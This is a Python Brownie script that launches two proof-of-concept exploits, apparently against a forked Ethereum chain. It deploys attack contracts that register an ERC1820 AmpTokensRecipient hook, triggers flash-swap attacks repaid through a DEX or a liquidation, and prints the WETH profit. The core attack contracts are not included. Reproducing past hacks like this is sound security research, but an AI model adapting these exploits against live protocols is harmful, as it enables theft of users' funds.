from brownie import accounts, interface, Luck, Luck2, chain
from rich import print as rp


def main():
    weth = interface.WETH('0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')
    rp('[bold green]------ Exploit 1: using DEX obtain ETH to repay flash swap ------------[/]')
    rp('[bold green]------> Step 1: deploy attack contract and register `AmpTokensRecipient` in erc1820[/]')
    hacker = accounts[0]
    luck = Luck.deploy({
        'from': hacker
    })
    old_balance = luck.balance()
    rp(f':vampire: [bold]before: [/] balance is {old_balance / 1e18} ETH')
    rp('[bold green]------> Step 2: call good_luck() to launch an attack[/]')
    luck.good_luck({
        'from': hacker
    })
    rp(f':vampire: [bold]After: [/] balance is {weth.balanceOf(luck) / 1e18} WETH')
    rp(f':vampire: [bold]After: [/] profit is {(weth.balanceOf(luck) + luck.balance() - old_balance)/1e18} WETH')

    chain.reset()
    rp('[bold green]------ Exploit 2: using Liquidation obtain ETH to repay flash swap ------------[/]')
    rp('[bold green]------> Step 1: deploy attack contract and register `AmpTokensRecipient` in erc1820[/]')
    hacker = accounts[2]
    luck = Luck2.deploy({
        'from': hacker
    })
    old_balance = luck.balance()
    rp(f':vampire: [bold]before: [/] balance is {old_balance / 1e18} ETH')
    rp('[bold green]------> Step 2: call good_luck() to launch an attack[/]')
    luck.good_luck({
        'from': hacker
    })
    rp(f':vampire: [bold]After: [/] balance is {weth.balanceOf(luck) / 1e18} WETH')
    rp(f':vampire: [bold]After: [/] profit is {(weth.balanceOf(luck) + luck.balance() - old_balance)/1e18} WETH')
